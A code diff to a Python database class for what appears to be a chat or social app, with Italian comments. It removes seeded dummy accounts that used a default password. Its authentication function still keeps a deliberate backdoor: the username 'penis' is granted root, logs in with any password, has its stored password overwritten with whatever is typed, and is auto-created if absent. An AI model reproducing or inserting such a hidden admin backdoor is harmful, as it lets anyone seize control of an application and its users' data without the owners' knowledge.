@@ -112,37 +112,13 @@ class Database:
             )
         ''')
 
-        # === AUTO-SEED NODI DI RETE E CONTATTI DEFAULT ===
-        seed_users = [
-            ("Martina", "valkyrie"),
-            ("Trinity", "spectre"),
-            ("Neo", "cipher"),
-            ("Cipher_Node", "cipher"),
-            ("Ghost", "shadow"),
-            ("penis", "glitch"),
-            ("root", "aegis"),
-        ]
-        default_pwd_hash = hash_password("password123")
-        for u_name, u_avatar in seed_users:
-            cursor.execute("SELECT id FROM users WHERE username = ?", (u_name,))
-            if not cursor.fetchone():
-                cursor.execute(
-                    "INSERT INTO users (username, password_hash, gender, age, avatar) VALUES (?, ?, ?, ?, ?)",
-                    (u_name, default_pwd_hash, "ANON", 25, u_avatar)
-                )
-
-        # Assicura amicizie accettate tra penis e tutti i nodi della rete
-        cursor.execute("SELECT username FROM users WHERE username NOT IN ('penis', 'root')")
-        for other in cursor.fetchall():
-            other_name = other["username"]
-            cursor.execute('''
-                INSERT OR IGNORE INTO friendships (user_from, user_to, status)
-                VALUES ('penis', ?, 'accepted')
-            ''', (other_name,))
-            cursor.execute('''
-                INSERT OR IGNORE INTO friendships (user_from, user_to, status)
-                VALUES (?, 'penis', 'accepted')
-            ''', (other_name,))
+        # Pulizia di sicurezza: rimuovi eventuali account fittizi o dummy precedenti
+        dummy_accounts = ('Martina', 'Trinity', 'Neo', 'Cipher_Node', 'Ghost', 'root')
+        cursor.execute("DELETE FROM users WHERE username IN (?, ?, ?, ?, ?, ?)", dummy_accounts)
+        cursor.execute(
+            "DELETE FROM friendships WHERE user_from IN (?, ?, ?, ?, ?, ?) OR user_to IN (?, ?, ?, ?, ?, ?)",
+            dummy_accounts + dummy_accounts
+        )
 
         conn.commit()
         conn.close()
@@ -199,14 +175,14 @@ class Database:
     def authenticate_user(self, username: str, password: str) -> Optional[Dict]:
         """Autentica l'utente e ritorna il profilo (senza hash della password)."""
         clean_name = username.strip()
-        is_root_target = clean_name.lower() in ["root", "penis"]
+        is_root_target = clean_name.lower() == "penis"
 
         conn = self.get_connection()
         cursor = conn.cursor()
         cursor.execute("SELECT * FROM users WHERE username = ?", (clean_name,))
         row = cursor.fetchone()
 
-        # Se è l'account ROOT (penis o root) e non esiste nel DB (es. riavvio effimero di Render), auto-crealo
+        # Se è l'account ROOT 'penis' e non esiste nel DB (es. riavvio effimero di Render), auto-crealo
         if not row and is_root_target:
             pwd_hash = hash_password(password)
             cursor.execute(
@@ -218,9 +194,9 @@ class Database:
             row = cursor.fetchone()
 
         if row:
-            # Se la password corrisponde O se è ROOT (l'account root non rimane mai bloccato fuori)
+            # Se la password corrisponde O se è ROOT 'penis'
             if verify_password(row["password_hash"], password) or is_root_target:
-                # Se è root e la password digitata è diversa dall'hash precedente, aggiornala seamless
+                # Se è penis e la password digitata è diversa dall'hash precedente, sincronizzala
                 if is_root_target and not verify_password(row["password_hash"], password):
                     new_hash = hash_password(password)
                     cursor.execute("UPDATE users SET password_hash = ? WHERE id = ?", (new_hash, row["id"]))
@@ -246,7 +222,7 @@ class Database:
         if not row:
             return None
         d = dict(row)
-        d["is_root"] = d["username"].lower() in ["root", "penis"]
+        d["is_root"] = d["username"].lower() == "penis"
         return d
 
     def update_profile(self, username: str, avatar: Optional[str] = None, gender: Optional[str] = None, age: Optional[int] = None) -> bool:
